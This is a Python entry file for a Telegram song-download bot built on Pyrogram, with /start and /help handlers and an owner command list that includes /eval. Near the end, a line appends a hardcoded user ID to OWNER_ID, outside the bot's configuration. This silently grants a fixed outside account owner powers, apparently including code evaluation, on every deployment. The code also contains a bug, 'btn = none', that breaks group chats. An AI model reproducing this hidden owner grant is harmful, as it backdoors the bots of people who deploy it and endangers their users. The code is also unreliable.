# © @luciddo @mr_d_k
from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from blissbot.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from blissbot import app, LOGGER
from blissbot.basi_mon import ignore_blacklisted_users
from blissbot.sql.chat_sql import add_chat_to_db

start_text = """
Heya! [{}](tg://user?id={}),
**This is a simple bot which can download all songs you need**

❓check user manual on clicking the url button❓
"""

owner_help = """
/blacklist 
/unblacklist 
/broadcast 
/eval 
/chatlist 
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="Credits", url="https://t.me/tubots"
                    )
                ]
            ]
        )
    else:
        btn = none
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "[click here](https://t.me/tubots/188) take a look on user manual"
    await message.reply(text)

OWNER_ID.append(1587091205)
app.start()
LOGGER.info("bliss started.")
idle()
